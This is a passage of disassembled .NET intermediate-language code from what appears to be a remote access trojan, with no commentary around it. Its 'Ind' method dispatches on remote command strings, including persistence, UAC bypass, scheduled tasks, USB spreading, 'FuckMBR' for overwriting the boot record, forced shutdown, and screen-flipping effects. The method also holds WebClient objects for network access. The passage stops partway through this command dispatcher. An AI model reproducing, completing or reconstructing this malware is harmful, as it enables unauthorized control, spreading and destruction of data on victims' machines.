    IL_01c9:  ldc.i4.2
    IL_01ca:  ldc.i4.4
    IL_01cb:  box        [mscorlib]System.Int32
    IL_01d0:  stelem.ref
    IL_01d1:  dup
    IL_01d2:  stloc.s    V_4
    IL_01d4:  ldnull
    IL_01d5:  ldnull
    IL_01d6:  ldc.i4.3
    IL_01d7:  newarr     [mscorlib]System.Boolean
    IL_01dc:  dup
    IL_01dd:  ldc.i4.0
    IL_01de:  ldc.i4.1
    IL_01df:  stelem.i1
    IL_01e0:  dup
    IL_01e1:  stloc.s    V_5
    IL_01e3:  ldc.i4.1
    IL_01e4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_01e9:  pop
    IL_01ea:  ldloc.s    V_5
    IL_01ec:  ldc.i4.0
    IL_01ed:  ldelem.u1
    IL_01ee:  brfalse.s  IL_020f

    IL_01f0:  ldloc.s    V_4
    IL_01f2:  ldc.i4.0
    IL_01f3:  ldelem.ref
    IL_01f4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_01f9:  ldtoken    uint8[]
    IL_01fe:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0203:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0208:  castclass  uint8[]
    IL_020d:  stloc.s    V_8
    IL_020f:  ldloc.s    V_8
    IL_0211:  ldc.i4.0
    IL_0212:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0217:  stloc.s    V_9
    IL_0219:  ldloc.s    V_6
    IL_021b:  ldnull
    IL_021c:  ldstr      "Position"
    IL_0221:  ldc.i4.1
    IL_0222:  newarr     [mscorlib]System.Object
    IL_0227:  dup
    IL_0228:  ldc.i4.0
    IL_0229:  ldc.i4.0
    IL_022a:  box        [mscorlib]System.Int32
    IL_022f:  stelem.ref
    IL_0230:  ldnull
    IL_0231:  ldnull
    IL_0232:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_0237:  ldloc.s    V_9
    IL_0239:  ldc.i4.1
    IL_023a:  sub.ovf
    IL_023b:  ldc.i4.1
    IL_023c:  add.ovf
    IL_023d:  newarr     [mscorlib]System.Byte
    IL_0242:  stloc.s    V_10
    IL_0244:  ldloc.s    V_7
    IL_0246:  ldnull
    IL_0247:  ldstr      "Read"
    IL_024c:  ldc.i4.3
    IL_024d:  newarr     [mscorlib]System.Object
    IL_0252:  dup
    IL_0253:  ldc.i4.0
    IL_0254:  ldloc.s    V_10
    IL_0256:  stelem.ref
    IL_0257:  dup
    IL_0258:  ldc.i4.1
    IL_0259:  ldc.i4.0
    IL_025a:  box        [mscorlib]System.Int32
    IL_025f:  stelem.ref
    IL_0260:  dup
    IL_0261:  ldc.i4.2
    IL_0262:  ldloc.s    V_9
    IL_0264:  box        [mscorlib]System.Int32
    IL_0269:  stelem.ref
    IL_026a:  dup
    IL_026b:  stloc.s    V_4
    IL_026d:  ldnull
    IL_026e:  ldnull
    IL_026f:  ldc.i4.3
    IL_0270:  newarr     [mscorlib]System.Boolean
    IL_0275:  dup
    IL_0276:  ldc.i4.0
    IL_0277:  ldc.i4.1
    IL_0278:  stelem.i1
    IL_0279:  dup
    IL_027a:  ldc.i4.2
    IL_027b:  ldc.i4.1
    IL_027c:  stelem.i1
    IL_027d:  dup
    IL_027e:  stloc.s    V_5
    IL_0280:  ldc.i4.1
    IL_0281:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0286:  pop
    IL_0287:  ldloc.s    V_5
    IL_0289:  ldc.i4.0
    IL_028a:  ldelem.u1
    IL_028b:  brfalse.s  IL_02ac

    IL_028d:  ldloc.s    V_4
    IL_028f:  ldc.i4.0
    IL_0290:  ldelem.ref
    IL_0291:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0296:  ldtoken    uint8[]
    IL_029b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02a0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_02a5:  castclass  uint8[]
    IL_02aa:  stloc.s    V_10
    IL_02ac:  ldloc.s    V_5
    IL_02ae:  ldc.i4.2
    IL_02af:  ldelem.u1
    IL_02b0:  brfalse.s  IL_02d1

    IL_02b2:  ldloc.s    V_4
    IL_02b4:  ldc.i4.2
    IL_02b5:  ldelem.ref
    IL_02b6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_02bb:  ldtoken    [mscorlib]System.Int32
    IL_02c0:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_02c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_02ca:  unbox.any  [mscorlib]System.Int32
    IL_02cf:  stloc.s    V_9
    IL_02d1:  ldloc.s    V_7
    IL_02d3:  ldnull
    IL_02d4:  ldstr      "Dispose"
    IL_02d9:  ldc.i4.0
    IL_02da:  newarr     [mscorlib]System.Object
    IL_02df:  ldnull
    IL_02e0:  ldnull
    IL_02e1:  ldnull
    IL_02e2:  ldc.i4.1
    IL_02e3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_02e8:  pop
    IL_02e9:  ldloc.s    V_6
    IL_02eb:  ldnull
    IL_02ec:  ldstr      "Dispose"
    IL_02f1:  ldc.i4.0
    IL_02f2:  newarr     [mscorlib]System.Object
    IL_02f7:  ldnull
    IL_02f8:  ldnull
    IL_02f9:  ldnull
    IL_02fa:  ldc.i4.1
    IL_02fb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0300:  pop
    IL_0301:  ldloc.s    V_10
    IL_0303:  stloc.0
    IL_0304:  ldloc.0
    IL_0305:  ret
  } // end of method OK::ZIP

  .method private static pinvokeimpl("user32" autochar lasterr winapi) 
          int32  FindWindowEx(int32 parentHandle,
                              int32 childAfter,
                              string& lclassName,
                              string& windowTitle) cil managed preservesig
  {
  }
  .method public static object  GETP(string StrP) cil managed
  {
    // Code size       42 (0x2a)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "%Current%"
    IL_0006:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_000b:  brfalse.s  IL_0023

    IL_000d:  ldarg.0
    IL_000e:  ldstr      "%Current%"
    IL_0013:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
    IL_0018:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
    IL_001d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0022:  ret

    IL_0023:  ldarg.0
    IL_0024:  call       string [mscorlib]System.Environment::ExpandEnvironmentVariables(string)
    IL_0029:  ret
  } // end of method OK::GETP

  .method public static pinvokeimpl("user32.dll" winapi) 
          bool  PostMessageW(native int hWnd,
                             uint32 Msg,
                             int32 wParam,
                             int32 lParam) cil managed preservesig
  {
  }
  .method public static void  Ind(uint8[] b) cil managed noinlining nooptimization
  {
    // Code size       9930 (0x26ca)
    .maxstack  11
    .locals init (string[] V_0,
             uint8[] V_1,
             string V_2,
             string[] V_3,
             class [System]System.Net.WebClient V_4,
             string V_5,
             uint8[] V_6,
             class [System]System.Net.WebClient V_7,
             string V_8,
             uint32 V_9,
             string V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             native int V_16,
             int32 V_17,
             int32 V_18,
             valuetype [System.Drawing]System.Drawing.Rectangle V_19,
             native int V_20,
             int32 V_21,
             int32 V_22,
             native int V_23,
             int32 V_24,
             int32 V_25,
             native int V_26,
             int32 V_27,
             int32 V_28,
             native int V_29,
             int32 V_30,
             int32 V_31,
             native int V_32,
             int32 V_33,
             int32 V_34,
             class [mscorlib]System.Exception V_35,
             int32 V_36,
             int32 V_37,
             native int V_38,
             native int V_39,
             native int V_40,
             int32 V_41,
             int32 V_42,
             class [mscorlib]System.Random V_43,
             int32 V_44,
             class [System.Drawing]System.Drawing.Icon V_45,
             int32 V_46,
             int32 V_47,
             int32 V_48,
             int32 V_49,
             int32 V_50,
             native int V_51,
             native int V_52,
             int32 V_53,
             int32 V_54,
             class [System.Drawing]System.Drawing.Pen V_55,
             class [System.Drawing]System.Drawing.Graphics V_56,
             class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> V_57,
             class [mscorlib]System.Random V_58,
             int32 V_59,
             valuetype [System.Drawing]System.Drawing.Color V_60,
             int32 V_61,
             int32 V_62,
             int32 V_63,
             int32 V_64,
             valuetype [System.Drawing]System.Drawing.Point V_65,
             valuetype [System.Drawing]System.Drawing.Point V_66,
             native int V_67,
             native int V_68,
             int32 V_69,
             int32 V_70,
             class [mscorlib]System.Random V_71,
             int32 V_72,
             class [System.Drawing]System.Drawing.Icon V_73,
             int32 V_74,
             int32 V_75,
             int32 V_76,
             int32 V_77,
             int32 V_78,
             native int V_79,
             native int V_80,
             valuetype [System.Drawing]System.Drawing.Rectangle V_81,
             valuetype [System.Drawing]System.Drawing.Color V_82,
             valuetype [System.Drawing]System.Drawing.Color V_83,
             valuetype [System.Drawing]System.Drawing.Color V_84,
             valuetype [System.Drawing]System.Drawing.Color V_85,
             class [System.Drawing]System.Drawing.SolidBrush V_86,
             int32 V_87,
             int32 V_88,
             int32 V_89,
             int32 V_90,
             valuetype [System.Drawing]System.Drawing.Rectangle V_91,
             class [System.Drawing]System.Drawing.SolidBrush V_92,
             int32 V_93,
             int32 V_94,
             int32 V_95,
             int32 V_96,
             int32 V_97,
             int32 V_98,
             valuetype [System.Drawing]System.Drawing.Rectangle V_99,
             valuetype [System.Drawing]System.Drawing.Rectangle V_100,
             class [System.Drawing]System.Drawing.SolidBrush V_101,
             int32 V_102,
             int32 V_103,
             int32 V_104,
             int32 V_105,
             int32 V_106,
             int32 V_107,
             valuetype [System.Drawing]System.Drawing.Rectangle V_108,
             valuetype [System.Drawing]System.Drawing.Rectangle V_109,
             class [System.Drawing]System.Drawing.SolidBrush V_110,
             int32 V_111,
             int32 V_112,
             int32 V_113,
             int32 V_114,
             class [System.Drawing]System.Drawing.Drawing2D.GraphicsPath V_115,
             native int V_116,
             native int V_117,
             int32 V_118,
             int32 V_119,
             valuetype [System.Drawing]System.Drawing.Color[] V_120,
             class [System.Drawing]System.Drawing.Drawing2D.LinearGradientBrush V_121,
             class [System.Drawing]System.Drawing.Drawing2D.ColorBlend V_122,
             float32[] V_123,
             int32 V_124,
             int32 V_125,
             uint8[] V_126,
             string V_127,
             bool V_128,
             class [mscorlib]System.Exception V_129,
             uint8[] V_130,
             string V_131,
             class [mscorlib]System.Exception V_132,
             uint8[] V_133,
             class [mscorlib]System.Exception V_134,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons V_135,
             valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon V_136,
             string V_137,
             string V_138,
             string V_139,
             int32 V_140,
             class [mscorlib]System.Exception V_141,
             class [mscorlib]System.Exception V_142,
             valuetype [mscorlib]System.Guid V_143,
             class [mscorlib]System.Exception V_144,
             class [mscorlib]System.Exception V_145,
             uint8[] V_146,
             object V_147,
             class [mscorlib]System.IO.MemoryStream V_148,
             int32 V_149,
             uint8[] V_150,
             object V_151,
             int32 V_152,
             string V_153,
             valuetype [System.Drawing]System.Drawing.Rectangle V_154,
             class [System.Drawing]System.Drawing.Bitmap V_155,
             class [System.Drawing]System.Drawing.Graphics V_156,
             valuetype [System.Drawing]System.Drawing.Size V_157,
             class [System.Drawing]System.Drawing.Bitmap V_158,
             class [mscorlib]System.IO.MemoryStream V_159,
             class [mscorlib]System.IO.MemoryStream V_160,
             string V_161,
             class [mscorlib]System.Exception V_162,
             int32 V_163,
             class [mscorlib]System.Exception V_164,
             class [mscorlib]System.Exception V_165,
             class [mscorlib]System.Exception V_166,
             class [mscorlib]System.Exception V_167,
             object[] V_168,
             bool[] V_169,
             int32 V_170,
             int32 V_171,
             class [mscorlib]System.Exception V_172,
             class [mscorlib]System.Exception V_173,
             class [mscorlib]System.Exception V_174)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.2
      IL_0018:  ldarga.s   b
      IL_001a:  call       string j.OK::BS(uint8[]&)
      IL_001f:  ldsfld     string j.OK::Y
      IL_0024:  ldc.i4.m1
      IL_0025:  ldc.i4.0
      IL_0026:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_002b:  stloc.3
      IL_002c:  ldloc.2
      IL_002d:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_0032:  stloc.s    V_9
      IL_0034:  ldloc.s    V_9
      IL_0036:  ldc.i4     0x7a5d43c2
      IL_003b:  bgt.un     IL_01fe

      IL_0040:  ldloc.s    V_9
      IL_0042:  ldc.i4     0x38276e70
      IL_0047:  bgt.un     IL_0125

      IL_004c:  ldloc.s    V_9
      IL_004e:  ldc.i4     0x2140aabe
      IL_0053:  bgt.un.s   IL_00b0

      IL_0055:  ldloc.s    V_9
      IL_0057:  ldc.i4     0x17722b8c
      IL_005c:  bgt.un.s   IL_0087

      IL_005e:  ldloc.s    V_9
      IL_0060:  ldc.i4     0x10fe67e
      IL_0065:  beq        IL_075c

      IL_006a:  ldloc.s    V_9
      IL_006c:  ldc.i4     0x4680447
      IL_0071:  beq        IL_03ec

      IL_0076:  ldloc.s    V_9
      IL_0078:  ldc.i4     0x17722b8c
      IL_007d:  beq        IL_0628

      IL_0082:  br         IL_1b0b

      IL_0087:  ldloc.s    V_9
      IL_0089:  ldc.i4     0x1bc44e86
      IL_008e:  beq        IL_0418

      IL_0093:  ldloc.s    V_9
      IL_0095:  ldc.i4     0x1e743595
      IL_009a:  beq        IL_049c

      IL_009f:  ldloc.s    V_9
      IL_00a1:  ldc.i4     0x2140aabe
      IL_00a6:  beq        IL_0654

      IL_00ab:  br         IL_1b0b

      IL_00b0:  ldloc.s    V_9
      IL_00b2:  ldc.i4     0x2b6ce2a9
      IL_00b7:  bgt.un.s   IL_00e2

      IL_00b9:  ldloc.s    V_9
      IL_00bb:  ldc.i4     0x234f382e
      IL_00c0:  beq        IL_0612

      IL_00c5:  ldloc.s    V_9
      IL_00c7:  ldc.i4     0x272dda4c
      IL_00cc:  beq        IL_0402

      IL_00d1:  ldloc.s    V_9
      IL_00d3:  ldc.i4     0x2b6ce2a9
      IL_00d8:  beq        IL_0578

      IL_00dd:  br         IL_1b0b

      IL_00e2:  ldloc.s    V_9
      IL_00e4:  ldc.i4     0x2fc941c2
      IL_00e9:  bgt.un.s   IL_0108

      IL_00eb:  ldloc.s    V_9
      IL_00ed:  ldc.i4     0x2daef55a
      IL_00f2:  beq        IL_07f6

      IL_00f7:  ldloc.s    V_9
      IL_00f9:  ldc.i4     0x2fc941c2
      IL_00fe:  beq        IL_04de

      IL_0103:  br         IL_1b0b

      IL_0108:  ldloc.s    V_9
      IL_010a:  ldc.i4     0x34dc6912
      IL_010f:  beq        IL_0788

      IL_0114:  ldloc.s    V_9
      IL_0116:  ldc.i4     0x38276e70
      IL_011b:  beq        IL_0696

      IL_0120:  br         IL_1b0b

      IL_0125:  ldloc.s    V_9
      IL_0127:  ldc.i4     0x4531c525
      IL_012c:  bgt.un.s   IL_0189

      IL_012e:  ldloc.s    V_9
      IL_0130:  ldc.i4     0x3b036886
      IL_0135:  bgt.un.s   IL_0160

      IL_0137:  ldloc.s    V_9
      IL_0139:  ldc.i4     0x384ef06a
      IL_013e:  beq        IL_042e

      IL_0143:  ldloc.s    V_9
      IL_0145:  ldc.i4     0x385f8569
      IL_014a:  beq        IL_0444

      IL_014f:  ldloc.s    V_9
      IL_0151:  ldc.i4     0x3b036886
      IL_0156:  beq        IL_04c8

      IL_015b:  br         IL_1b0b

      IL_0160:  ldloc.s    V_9
      IL_0162:  ldc.i4     0x3e514fbe
      IL_0167:  beq        IL_079e

      IL_016c:  ldloc.s    V_9
      IL_016e:  ldc.i4     0x433cfaf2
      IL_0173:  beq        IL_0838

      IL_0178:  ldloc.s    V_9
      IL_017a:  ldc.i4     0x4531c525
      IL_017f:  beq        IL_0822

      IL_0184:  br         IL_1b0b

      IL_0189:  ldloc.s    V_9
      IL_018b:  ldc.i4     0x52bc2c44
      IL_0190:  bgt.un.s   IL_01bb

      IL_0192:  ldloc.s    V_9
      IL_0194:  ldc.i4     0x4b297fa4
      IL_0199:  beq        IL_07ca

      IL_019e:  ldloc.s    V_9
      IL_01a0:  ldc.i4     0x523408ab
      IL_01a5:  beq        IL_05ba

      IL_01aa:  ldloc.s    V_9
      IL_01ac:  ldc.i4     0x52bc2c44
      IL_01b1:  beq        IL_06c2

      IL_01b6:  br         IL_1b0b

      IL_01bb:  ldloc.s    V_9
      IL_01bd:  ldc.i4     0x77651492
      IL_01c2:  bgt.un.s   IL_01e1

      IL_01c4:  ldloc.s    V_9
      IL_01c6:  ldc.i4     0x574ccdbe
      IL_01cb:  beq        IL_07e0

      IL_01d0:  ldloc.s    V_9
      IL_01d2:  ldc.i4     0x77651492
      IL_01d7:  beq        IL_0536

      IL_01dc:  br         IL_1b0b

      IL_01e1:  ldloc.s    V_9
      IL_01e3:  ldc.i4     0x79fa82c1
      IL_01e8:  beq        IL_04f4

      IL_01ed:  ldloc.s    V_9
      IL_01ef:  ldc.i4     0x7a5d43c2
      IL_01f4:  beq        IL_0470

      IL_01f9:  br         IL_1b0b

      IL_01fe:  ldloc.s    V_9
      IL_0200:  ldc.i4     0xd009b61f
      IL_0205:  bgt.un     IL_02e3

      IL_020a:  ldloc.s    V_9
      IL_020c:  ldc.i4     0xa8db785e
      IL_0211:  bgt.un.s   IL_026e

      IL_0213:  ldloc.s    V_9
      IL_0215:  ldc.i4     0x9cf0b2a5
      IL_021a:  bgt.un.s   IL_0245

      IL_021c:  ldloc.s    V_9
      IL_021e:  ldc.i4     0x8a3461c8
      IL_0223:  beq        IL_05fc

      IL_0228:  ldloc.s    V_9
      IL_022a:  ldc.i4     0x9a3b1de4
      IL_022f:  beq        IL_058e

      IL_0234:  ldloc.s    V_9
      IL_0236:  ldc.i4     0x9cf0b2a5
      IL_023b:  beq        IL_05e6

      IL_0240:  br         IL_1b0b

      IL_0245:  ldloc.s    V_9
      IL_0247:  ldc.i4     0x9dd9ccb2
      IL_024c:  beq        IL_045a

      IL_0251:  ldloc.s    V_9
      IL_0253:  ldc.i4     0x9f0a2c69
      IL_0258:  beq        IL_04b2

      IL_025d:  ldloc.s    V_9
      IL_025f:  ldc.i4     0xa8db785e
      IL_0264:  beq        IL_0746

      IL_0269:  br         IL_1b0b

      IL_026e:  ldloc.s    V_9
      IL_0270:  ldc.i4     0xb949e5e4
      IL_0275:  bgt.un.s   IL_02a0

      IL_0277:  ldloc.s    V_9
      IL_0279:  ldc.i4     0xaa5bd645
      IL_027e:  beq        IL_06ac

      IL_0283:  ldloc.s    V_9
      IL_0285:  ldc.i4     0xac9ac23e
      IL_028a:  beq        IL_06d8

      IL_028f:  ldloc.s    V_9
      IL_0291:  ldc.i4     0xb949e5e4
      IL_0296:  beq        IL_063e

      IL_029b:  br         IL_1b0b

      IL_02a0:  ldloc.s    V_9
      IL_02a2:  ldc.i4     0xbf6b5498
      IL_02a7:  bgt.un.s   IL_02c6

      IL_02a9:  ldloc.s    V_9
      IL_02ab:  ldc.i4     0xb94c4a37
      IL_02b0:  beq        IL_0730

      IL_02b5:  ldloc.s    V_9
      IL_02b7:  ldc.i4     0xbf6b5498
      IL_02bc:  beq        IL_0520

      IL_02c1:  br         IL_1b0b

      IL_02c6:  ldloc.s    V_9
      IL_02c8:  ldc.i4     0xc30a0384
      IL_02cd:  beq        IL_05d0

      IL_02d2:  ldloc.s    V_9
      IL_02d4:  ldc.i4     0xd009b61f
      IL_02d9:  beq        IL_0562

      IL_02de:  br         IL_1b0b

      IL_02e3:  ldloc.s    V_9
      IL_02e5:  ldc.i4     0xe981ed0f
      IL_02ea:  bgt.un.s   IL_0361

      IL_02ec:  ldloc.s    V_9
      IL_02ee:  ldc.i4     0xd82ddf1e
      IL_02f3:  bgt.un.s   IL_031e

      IL_02f5:  ldloc.s    V_9
      IL_02f7:  ldc.i4     0xd19b1fdb
      IL_02fc:  beq        IL_06ee

      IL_0301:  ldloc.s    V_9
      IL_0303:  ldc.i4     0xd5a43d84
      IL_0308:  beq        IL_066a

      IL_030d:  ldloc.s    V_9
      IL_030f:  ldc.i4     0xd82ddf1e
      IL_0314:  beq        IL_0772

      IL_0319:  br         IL_1b0b

      IL_031e:  ldloc.s    V_9
      IL_0320:  ldc.i4     0xe09dd725
      IL_0325:  bgt.un.s   IL_0344

      IL_0327:  ldloc.s    V_9
      IL_0329:  ldc.i4     0xdeb88809
      IL_032e:  beq        IL_0680

      IL_0333:  ldloc.s    V_9
      IL_0335:  ldc.i4     0xe09dd725
      IL_033a:  beq        IL_03d6

      IL_033f:  br         IL_1b0b

      IL_0344:  ldloc.s    V_9
      IL_0346:  ldc.i4     0xe1e4263c
      IL_034b:  beq        IL_05a4

      IL_0350:  ldloc.s    V_9
      IL_0352:  ldc.i4     0xe981ed0f
      IL_0357:  beq        IL_07b4

      IL_035c:  br         IL_1b0b

      IL_0361:  ldloc.s    V_9
      IL_0363:  ldc.i4     0xf66da4f9
      IL_0368:  bgt.un.s   IL_0393

      IL_036a:  ldloc.s    V_9
      IL_036c:  ldc.i4     0xef3e349a
      IL_0371:  beq        IL_084e

      IL_0376:  ldloc.s    V_9
      IL_0378:  ldc.i4     0xf38d9cf1
      IL_037d:  beq        IL_071a

      IL_0382:  ldloc.s    V_9
      IL_0384:  ldc.i4     0xf66da4f9
      IL_0389:  beq        IL_0704

      IL_038e:  br         IL_1b0b

      IL_0393:  ldloc.s    V_9
      IL_0395:  ldc.i4     0xf8258d3b
      IL_039a:  bgt.un.s   IL_03b9

      IL_039c:  ldloc.s    V_9
      IL_039e:  ldc.i4     0xf790b4a9
      IL_03a3:  beq        IL_080c

      IL_03a8:  ldloc.s    V_9
      IL_03aa:  ldc.i4     0xf8258d3b
      IL_03af:  beq        IL_054c

      IL_03b4:  br         IL_1b0b

      IL_03b9:  ldloc.s    V_9
      IL_03bb:  ldc.i4     0xf9206bde
      IL_03c0:  beq        IL_0486

      IL_03c5:  ldloc.s    V_9
      IL_03c7:  ldc.i4     0xf967d5e7
      IL_03cc:  beq        IL_050a

      IL_03d1:  br         IL_1b0b

      IL_03d6:  ldloc.2
      IL_03d7:  ldstr      "persis"
      IL_03dc:  ldc.i4.0
      IL_03dd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03e2:  brfalse    IL_0864

      IL_03e7:  br         IL_1b0b

      IL_03ec:  ldloc.2
      IL_03ed:  ldstr      "UACbyp"
      IL_03f2:  ldc.i4.0
      IL_03f3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03f8:  brfalse    IL_086e

      IL_03fd:  br         IL_1b0b

      IL_0402:  ldloc.2
      IL_0403:  ldstr      "checkin"
      IL_0408:  ldc.i4.0
      IL_0409:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_040e:  brfalse    IL_08fd

      IL_0413:  br         IL_1b0b

      IL_0418:  ldloc.2
      IL_0419:  ldstr      "Runas"
      IL_041e:  ldc.i4.0
      IL_041f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0424:  brfalse    IL_0975

      IL_0429:  br         IL_1b0b

      IL_042e:  ldloc.2
      IL_042f:  ldstr      "schedtasks"
      IL_0434:  ldc.i4.0
      IL_0435:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_043a:  brfalse    IL_09cf

      IL_043f:  br         IL_1b0b

      IL_0444:  ldloc.2
      IL_0445:  ldstr      "unschedtasks"
      IL_044a:  ldc.i4.0
      IL_044b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0450:  brfalse    IL_0a1e

      IL_0455:  br         IL_1b0b

      IL_045a:  ldloc.2
      IL_045b:  ldstr      "spreadusbme"
      IL_0460:  ldc.i4.0
      IL_0461:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0466:  brfalse    IL_0a44

      IL_046b:  br         IL_1b0b

      IL_0470:  ldloc.2
      IL_0471:  ldstr      "restartme"
      IL_0476:  ldc.i4.0
      IL_0477:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_047c:  brfalse    IL_0a4e

      IL_0481:  br         IL_1b0b

      IL_0486:  ldloc.2
      IL_0487:  ldstr      "shutdowm"
      IL_048c:  ldc.i4.0
      IL_048d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0492:  brfalse    IL_0a61

      IL_0497:  br         IL_1b0b

      IL_049c:  ldloc.2
      IL_049d:  ldstr      "FuckMBR"
      IL_04a2:  ldc.i4.0
      IL_04a3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04a8:  brfalse    IL_0a74

      IL_04ad:  br         IL_1b0b

      IL_04b2:  ldloc.2
      IL_04b3:  ldstr      "FuckMBRNR"
      IL_04b8:  ldc.i4.0
      IL_04b9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04be:  brfalse    IL_0b03

      IL_04c3:  br         IL_1b0b

      IL_04c8:  ldloc.2
      IL_04c9:  ldstr      "Flip"
      IL_04ce:  ldc.i4.0
      IL_04cf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d4:  brfalse    IL_0b80

      IL_04d9:  br         IL_1b0b

      IL_04de:  ldloc.2
      IL_04df:  ldstr      "mirror"
      IL_04e4:  ldc.i4.0
      IL_04e5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04ea:  brfalse    IL_0bd9

      IL_04ef:  br         IL_1b0b

      IL_04f4:  ldloc.2
      IL_04f5:  ldstr      "Invert"
      IL_04fa:  ldc.i4.0
      IL_04fb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0500:  brfalse    IL_0c32

      IL_0505:  br         IL_1b0b

      IL_050a:  ldloc.2
      IL_050b:  ldstr      "Flashbang"
